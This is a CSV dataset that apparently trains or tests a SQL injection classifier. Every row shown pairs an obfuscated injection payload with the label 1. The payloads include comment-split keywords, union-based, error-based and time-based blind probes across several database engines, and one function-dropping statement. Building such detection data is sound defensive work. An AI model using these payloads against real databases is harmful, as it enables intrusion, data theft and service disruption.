Query,Label
"1%""  )   union all sele/**/ct nu/**/ll,nu/**/ll,n/**/ull,nul/**/l,nul/**/l,nu/**/ll,n/**/ull,nu/**/ll,nu/**/ll#",1
"1 o/**/r 5286  =    (  s/**/elect count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- mtaq",1
"1""  )   as assu w/**/here 7521  =  7521 o/**/r 5356  =    (  sel/**/ect count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1  )   as ndgd wh/**/ere 2367  =  2367 o/**/r 8156  =    (  selec/**/t count  (  *  )   fr/**/om generate_series  (  1,5000000   )    )   --",1
"1' i/**/n boolean mode  )   union all sele/**/ct nul/**/l,nul/**/l--",1
"-4669"" o/**/r 8571  =  8571--",1
sele/**/ct   (  case when   (  7019  =  1998  )   then 7019 else 7019*  (  s/**/elect 7019 fr/**/om mysql.db  )   end  )  #,1
"1 an/**/d 2716  =    (  sel/**/ect count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1"" an/**/d make_s/**/et  (  6520  =  9958,9958  )  ",1
"1  )    (  sel/**/ect   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   fro/**/m   (  valu/**/es  (  0   )    )     )   an/**/d   (  5099  =  5099",1
"s/**/elect count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 a/**/nd   (  ""vabm""  =  ""vabm",1
"sel/**/ect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   fr/**/om dual an/**/d   (  ""%""  =  """,1
"-9122  )   as sdlg wher/**/e 1546  =  1546 union all selec/**/t 1546,1546,1546,1546,1546,1546,1546--",1
"1',  (  s/**/elect   (  case when   (  6948  =  4654  )   then 1 else 6948*  (  s/**/elect 6948 fro/**/m mysql.db  )   end   )    )   ",1
"1""  )   a/**/nd   (  se/**/lect 9067 fro/**/m  (  se/**/lect count  (  *  )  ,concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x f/**/rom i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )   an/**/d   (  ""imlx""  =  ""imlx",1
1'||  (  selec/**/t 'glec' fr/**/om dual whe/**/re 4846  =  4846,1
1'  )   o/**/r sleep  (  5  )   an/**/d   (  'mdmr' lik/**/e 'mdmr,1
1  )   a/**/nd   (  3020  =  3020  )  *6703 an/**/d   (  9831  =  9831,1
1  )   w/**/here 5442  =  5442,1
"-8429'   )    )     )   o/**/r make_se/**/t  (  9354  =  9354,7185  )   a/**/nd    (    (     (  'bwih' lik/**/e 'bwih",1
"1'||  (  s/**/elect 'rask' fr/**/om dual w/**/here 9411  =  9411 an/**/d 4241  =  convert  (  i/**/nt,  (  sel/**/ect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selec/**/t   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",1
"1%"" an/**/d 6240  =    (  'qqpjq'||  (  sele/**/ct case 6240 when 6240 then 1 else 0 end fr/**/om rdb$d/**/atabase  )  ||'qzvzq'  )   a/**/nd ""%""  =  """,1
"sel/**/ect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tab/**/les as t3 an/**/d   (  ""pxbk"" l/**/ike ""pxbk",1
1'  )   w/**/here 5871  =  5871,1
1'+  (  sele/**/ct 'rsgi' whe/**/re 2258  =  2258,1
"1'||  (  selec/**/t 'xyft' fr/**/om dual wher/**/e 8250  =  8250 a/**/nd 5556  =    (  sele/**/ct count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",1
-4785' o/**/r   (  8459  =  8459  )  *4906 a/**/nd 'esfn'  =  'esfn,1
"-9318""   )    )     )   union all sel/**/ect 5223,5223,5223,5223#",1
1%'  )   a/**/nd   (  7704  =  3494  )  *3494 a/**/nd   (  '%'  =  ',1
1'  )   whe/**/re 9175  =  9175,1
"1""   )    )     )   a/**/nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   a/**/nd    (    (     (  ""staz"" li/**/ke ""staz",1
1'+  (  s/**/elect 'lpkv' wher/**/e 8760  =  8760,1
"-4347' union all se/**/lect 6074,6074,6074,6074,6074,6074,6074--",1
 (  selec/**/t * fr/**/om   (  selec/**/t  (  sleep  (  5   )    )     )  srmq  )   an/**/d   (  '%'  =  ',1
"1'||  (  sel/**/ect 'uqbj' fr/**/om dual wher/**/e 6736  =  6736 o/**/r char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,nul/**/l  )  --",1
"-6370'   )    )    as sims wher/**/e 9388  =  9388 union all se/**/lect 9388,9388,9388,9388,9388,9388,9388,9388#",1
"-9076'+  (  se/**/lect lqvj wher/**/e 8551  =  8551 union all se/**/lect 8551,8551,8551,8551--",1
-8341 o/**/r 8571  =  8571--,1
"1   )    )     )   o/**/r 4411  =    (  s/**/elect count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   a/**/nd    (    (     (  9255  =  9255",1
"selec/**/t count  (  *  )   fr/**/om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 an/**/d    (    (   '%'  =  '",1
"1'  )   wher/**/e 1323  =  1323 o/**/r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selec/**/t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
1'   )    )    as vuzt wh/**/ere 4971  =  4971,1
"1%'  )   an/**/d 8189  =    (  selec/**/t count  (  *  )   f/**/rom sysibm.systabl/**/es as t1,sysibm.systa/**/bles as t2,sysibm.systabl/**/es as t3  )  --",1
"-9871 union all se/**/lect 6094,6094,6094,6094,6094,6094,6094#",1
"-1236'+  (  s/**/elect 'fbgh' wh/**/ere 3896  =  3896 union all s/**/elect 3896,3896,3896,3896,3896,3896,3896,3896,3896--",1
" sel/**/ect sleep  (  5  )   an/**/d    (    (     (  ""%""  =  """,1
"1' a/**/nd make_se/**/t  (  2942  =  8200,8200  )   an/**/d 'jnhv' li/**/ke 'jnhv",1
1'  )   an/**/d 6969  =    (  sel/**/ect 6969 fro/**/m pg_sleep  (  5   )    )    a/**/nd   (  'ayol'  =  'ayol,1
"-2925%"" o/**/r make_se/**/t  (  9354  =  9354,7185  )   an/**/d ""%""  =  """,1
"  (  se/**/lect * fr/**/om generate_series  (  4990,4990,case when   (  4990  =  5065  )   then 1 else 0 end  )   l/**/imit 1  )  ",1
"se/**/lect l/**/ike  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )    an/**/d 'cwuy'  =  'cwuy",1
"1 an/**/d 5556  =    (  sel/**/ect count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",1
-9950' o/**/r 4425  =  1975,1
-2351   )    )    as xdqn wh/**/ere 4019  =  4019 o/**/r 8571  =  8571--,1
"1%""  )   an/**/d   (  s/**/elect 9067 f/**/rom  (  se/**/lect count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fr/**/om i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )   an/**/d   (  ""%""  =  """,1
"1   )    )    as jrzr wher/**/e 5194  =  5194 a/**/nd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
"-3501'   )    )     )   o/**/r make_s/**/et  (  7122  =  6158,6158  )   a/**/nd    (    (     (  'mlfl' li/**/ke 'mlfl",1
"1""  )   a/**/nd 3715 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selec/**/t   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   an/**/d   (  ""piya""  =  ""piya",1
1   )    )    as gxvp wher/**/e 3865  =  3865,1
1   )    )    o/**/r sleep  (  5  )   an/**/d    (    (   8285  =  8285,1
"1   )    )    union all se/**/lect nu/**/ll,n/**/ull,n/**/ull,n/**/ull,nu/**/ll,nu/**/ll--",1
"iif  (  5462  =  8866,1,1/0  )  ",1
"-2226%""   )    )    union all selec/**/t 1018,1018,1018,1018--",1
"1'   )    )    as hfra w/**/here 6500  =  6500 an/**/d 9660  =    (  sele/**/ct count  (  *  )   f/**/rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-8364'  )   union all sel/**/ect 4732,4732,4732,4732,4732,4732,4732,4732,4732#",1
"-3179'+  (  sele/**/ct 'tzzz' wher/**/e 3191  =  3191 union all s/**/elect 3191,3191,3191,3191,3191#",1
"1""   )    )    as rfgu wher/**/e 4880  =  4880 union all sel/**/ect nul/**/l,nu/**/ll,nu/**/ll,n/**/ull,nu/**/ll,nu/**/ll,nu/**/ll,nu/**/ll,nu/**/ll--",1
"-3326'+  (  selec/**/t xitp whe/**/re 7621  =  7621 union all s/**/elect 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",1
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  se/**/lect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   an/**/d 'swke'  =  'swke",1
-6095'  )   o/**/r 6872  =  6872 a/**/nd   (  'bfwm' li/**/ke 'bfwm,1
"1' wh/**/ere 5004  =  5004 o/**/r 7552  =    (  selec/**/t count  (  *  )   fro/**/m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'||  (  sele/**/ct 'cqjw' fr/**/om dual wher/**/e 7335  =  7335 an/**/d 8514  =    (  s/**/elect count  (  *  )   f/**/rom domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3   )    )   ||'",1
"1""   )    )     )   a/**/nd 6969  =    (  sele/**/ct 6969 fr/**/om pg_sleep  (  5   )    )    a/**/nd    (    (     (  ""ipqw"" l/**/ike ""ipqw",1
sel/**/ect   (  case when   (  2394  =  4530  )   then 2394 else 2394*  (  se/**/lect 2394 fr/**/om i/**/nfo/**/rmation_schema.character_se/**/ts  )   end  )  #,1
"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1 o/**/r elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",1
"-3862   )    )    as vqtl wher/**/e 9629  =  9629 union all s/**/elect 9629,9629,9629,9629,9629--",1
"1"" wher/**/e 3227  =  3227 waitfo/**/r delay '0:0:5'--",1
"-8002'   )    )     )   union all sel/**/ect 6647,6647,6647--",1
selec/**/t   (  case when   (  9732  =  7136  )   then 9732 else 9732*  (  se/**/lect 9732 fr/**/om i/**/nfo/**/rmation_schema.character_se/**/ts  )   end  )  #,1
"-1998'  )   as kgvf wher/**/e 2346  =  2346 union all selec/**/t 2346,2346,2346,2346,2346,2346,2346,2346,2346--",1
"1%'   )    )    union all se/**/lect nul/**/l,nu/**/ll#",1
"-9596  )   wh/**/ere 3425  =  3425 union all s/**/elect 3425,3425,3425,3425,3425,3425#",1
" end an/**/d   (  ""nuix"" lik/**/e ""nuix",1
1' an/**/d   (  3020  =  3020  )  *6703 an/**/d 'tmng' lik/**/e 'tmng,1
1   )    )    rlik/**/e   (  se/**/lect * f/**/rom   (  se/**/lect  (  sleep  (  5   )    )     )  vwyq  )  #,1
"1'   )    )     )   o/**/r 8384  =  lik/**/e  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )    an/**/d    (    (     (  'jueq'  =  'jueq",1
1' a/**/nd sleep  (  5  )   an/**/d 'usgv' l/**/ike 'usgv,1
"1%""   )    )    a/**/nd 2006  =  2006",1
"1""   )    )    as ktue whe/**/re 6392  =  6392 a/**/nd 8514  =    (  sele/**/ct count  (  *  )   f/**/rom domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tab/**/les as t3  )  --",1
waitfo/**/r delay '0:0:5' an/**/d    (    (     (  '%'  =  ',1
"-8777""  )   as lalf wher/**/e 8606  =  8606 o/**/r elt  (  4397  =  5823,5823  )  --",1
"1""   )    )     )   o/**/r 1022  =    (  se/**/lect count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1   )    )    as huxq whe/**/re 7451  =  7451 union all se/**/lect n/**/ull,nul/**/l,n/**/ull--",1
"-9531'   )    )     )   union all se/**/lect 4076,4076#",1
"-8924   )    )    as jybr wh/**/ere 7901  =  7901 o/**/r elt  (  1032  =  1032,3623  )  --",1
"1""  )   union all sel/**/ect n/**/ull,nu/**/ll,nul/**/l,nul/**/l#",1
"1"" o/**/r   (  sele/**/ct 2*  (  if   (    (   sele/**/ct * f/**/rom   (  sele/**/ct concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d ""uqo/**/r"" l/**/ike ""uqo/**/r",1
se/**/lect   (  case when   (  9667  =  6212  )   then 9667 else cast  (  1 as i/**/nt  )  /  (  se/**/lect 0 fro/**/m dual  )   end  )   fr/**/om dual--,1
"-5379'  )   union all sele/**/ct 4294,4294,4294--",1
"1  )   wh/**/ere 6990  =  6990 an/**/d 2716  =    (  sel/**/ect count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1  )   as kaew wh/**/ere 2658  =  2658,1
-6588' wh/**/ere 7793  =  7793 o/**/r   (  8459  =  8459  )  *4906--,1
"1' i/**/n boolean mode  )   o/**/r row  (  1045,7562  )  >  (  se/**/lect count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x f/**/rom   (  selec/**/t 8488 union sele/**/ct 5584 union selec/**/t 3051 union selec/**/t 1210  )  a group b/**/y x  )  #",1
1'||  (  selec/**/t 'miew' w/**/here 8360  =  8360 waitfo/**/r delay '0:0:5'  )  ||',1
"-5672%"" o/**/r 3825  =  9675--",1
1' whe/**/re 2547  =  2547 a/**/nd 6969  =    (  sel/**/ect 6969 f/**/rom pg_sleep  (  5   )    )   --,1
selec/**/t sleep  (  5  )   an/**/d    (    (   '%'  =  ',1
sele/**/ct   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  s/**/elect 3537 fro/**/m mysql.db  )   end  )  #,1
1 a/**/nd 5934  =  7745,1
-4960'  )   union all selec/**/t 5300--,1
1'   )    )    o/**/r sleep  (  5  )  #,1
"1 a/**/nd 3580  =    (  s/**/elect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tabl/**/es as t3  )  --",1
1  )   o/**/r sleep  (  5  ) ,1
"1""   )    )    an/**/d 8407  =    (  s/**/elect count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )    a/**/nd    (    (   ""tfrs""  =  ""tfrs",1
"1%'  )   an/**/d 4241  =  convert  (  i/**/nt,  (  sel/**/ect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd   (  '%'  =  '",1
"1'  )   an/**/d   (  se/**/lect 2*  (  if   (    (   selec/**/t * fro/**/m   (  selec/**/t concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d   (  'fnjm'  =  'fnjm",1
"-5622"" wh/**/ere 7970  =  7970 union all selec/**/t 7970,7970,7970,7970,7970--",1
"1' an/**/d u/**/pdatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  sel/**/ect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   a/**/nd 'kird'  =  'kird",1
"1  )   o/**/r 5286  =    (  s/**/elect count  (  *  )   fr/**/om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   an/**/d   (  4976  =  4976",1
"-1263""  )   o/**/r 9323  =  9323#",1
selec/**/t   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  s/**/elect 9318 fro/**/m i/**/nfo/**/rmation_schema.character_se/**/ts  )   end  )  #,1
1' rli/**/ke sleep  (  5  )   a/**/nd 'cugs'  =  'cugs,1
1 wh/**/ere 7224  =  7224 an/**/d sleep  (  5  )  #,1
-1985   )    )     )   o/**/r 4144  =    (  sel/**/ect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fro/**/m dual  )   an/**/d    (    (     (  1248  =  1248,1
1' rlik/**/e   (  sele/**/ct * fr/**/om   (  s/**/elect  (  sleep  (  5   )    )     )  sgvo  )   a/**/nd 'mabd'  =  'mabd,1
1'   )    )    as xpmy w/**/here 5274  =  5274 rlik/**/e   (  se/**/lect   (  case when   (  6252  =  7704  )   then 1 else 0x28 end   )    )   --,1
1'   )    )    a/**/nd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an/**/d    (    (   'nui/**/s'  =  'nui/**/s,1
1  )   a/**/nd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selec/**/t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
"1"" a/**/nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   an/**/d ""kfps""  =  ""kfps",1
"1""  )   wh/**/ere 6311  =  6311",1
"-7423 o/**/r make_s/**/et  (  9354  =  9354,7185  )  -- hprc",1
1'+  (  sel/**/ect taga w/**/here 8036  =  8036,1
"1%"" a/**/nd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selec/**/t   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    a/**/nd ""%""  =  """,1
"1'   )    )     )   an/**/d   (  sel/**/ect 9067 fro/**/m  (  s/**/elect count  (  *  )  ,concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x f/**/rom i/**/nfo/**/rmation_schema.character_s/**/ets group b/**/y x  )  a  )   a/**/nd    (    (     (  'jicq' li/**/ke 'jicq",1
 (  se/**/lect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  5877  =  5877  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,1
"-1351"" wher/**/e 6968  =  6968 o/**/r 5684  =  8582",1
"-1030"" wh/**/ere 2161  =  2161 union all s/**/elect 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",1
"-4764""   )    )    o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se/**/lect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   an/**/d    (    (   ""dfvz"" lik/**/e ""dfvz",1
"1 wh/**/ere 1776  =  1776 a/**/nd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,nul/**/l  )  --",1
"1 wh/**/ere 3799  =  3799 an/**/d char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,nul/**/l  )  --",1
"-9672'   )    )    as rupb w/**/here 8218  =  8218 o/**/r make_se/**/t  (  4954  =  1836,1836  )  --",1
"1%"" an/**/d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n/**/ull  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
1'||  (  sel/**/ect 'cfff' w/**/here 4994  =  4994,1
1'+  (  selec/**/t 'jtvq' w/**/here 8288  =  8288 an/**/d   (  se/**/lect * fro/**/m   (  selec/**/t  (  sleep  (  5   )    )     )  gcrr  )  #,1
1'+  (  se/**/lect 'leok' whe/**/re 4320  =  4320,1
"1'+  (  selec/**/t 'uijv' wher/**/e 7279  =  7279 an/**/d 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"sel/**/ect count  (  *  )   f/**/rom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 an/**/d   (  1473  =  1473",1
1%'   )    )     )   an/**/d 4386  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    a/**/nd    (    (     (  '%'  =  ',1
"-5579%""  )   o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   an/**/d   (  ""%""  =  """,1
1  )   whe/**/re 2734  =  2734 waitfo/**/r delay '0:0:5'--,1
1'||  (  sel/**/ect 'qgnz' wher/**/e 6446  =  6446,1
1'   )    )    as nhkp wh/**/ere 8030  =  8030,1
"1%""   )    )    o/**/r exp  (  ~  (  sele/**/ct * f/**/rom   (  s/**/elect concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    an/**/d    (    (   ""%""  =  """,1
"sele/**/ct count  (  *  )   fr/**/om sysibm.systa/**/bles as t1,sysibm.syst/**/ables as t2,sysibm.systabl/**/es as t3 a/**/nd '%'  =  '",1
1   )    )    as gygm w/**/here 4024  =  4024,1
"-2448%""  )   o/**/r 3038  =  3038",1
"1'   )    )     )   a/**/nd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )   a/**/nd    (    (     (  'xzcr'  =  'xzcr",1
1'+  (  selec/**/t ijoh whe/**/re 7145  =  7145 o/**/rde/**/r b/**/y 1--,1
1   )    )    as sipp wh/**/ere 1999  =  1999 an/**/d   (  s/**/elect * fro/**/m   (  s/**/elect  (  sleep  (  5   )    )     )  fzno  )  --,1
"1""  )   a/**/nd 3202  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )    an/**/d   (  ""ikaf"" l/**/ike ""ikaf",1
if  (  1087  =  5839  )   sele/**/ct 1087 else d/**/rop function zzeh--,1
-8753  )   o/**/rd/**/er b/**/y 1#,1
"1'   )    )    o/**/r 9643  =    (  se/**/lect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tabl/**/es as t3  )   a/**/nd    (    (   'hfqz'  =  'hfqz",1
"-1485'   )    )     )   union all sele/**/ct 7661,7661,7661,7661,7661--",1
"s/**/elect count  (  *  )   fr/**/om sysibm.syst/**/ables as t1,sysibm.systa/**/bles as t2,sysibm.systab/**/les as t3 an/**/d   (  ""%""  =  """,1
1  )   as jqbp whe/**/re 5407  =  5407 a/**/nd 4595  =  4595#,1
"s/**/elect dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   fro/**/m dual--",1
"1%'  )   union all sele/**/ct n/**/ull,n/**/ull,nul/**/l,n/**/ull,n/**/ull,n/**/ull,nul/**/l,nu/**/ll,nul/**/l#",1
1'+  (  se/**/lect wpai w/**/here 3685  =  3685,1
-6165%'   )    )    union all s/**/elect 5384#,1
1   )    )    as msug w/**/here 3503  =  3503 a/**/nd sleep  (  5  )  #,1
"1'   )    )     )   union all selec/**/t n/**/ull,nul/**/l,n/**/ull,nul/**/l,n/**/ull,n/**/ull,nu/**/ll,n/**/ull,nul/**/l,nul/**/l--",1
"call regexp_substri/**/ng  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,nul/**/l  )   an/**/d    (    (   'frpo' li/**/ke 'frpo",1
"1""  )   wh/**/ere 2656  =  2656 o/**/r sleep  (  5  )  --",1
-7786'   )    )    o/**/r 9323  =  9323#,1
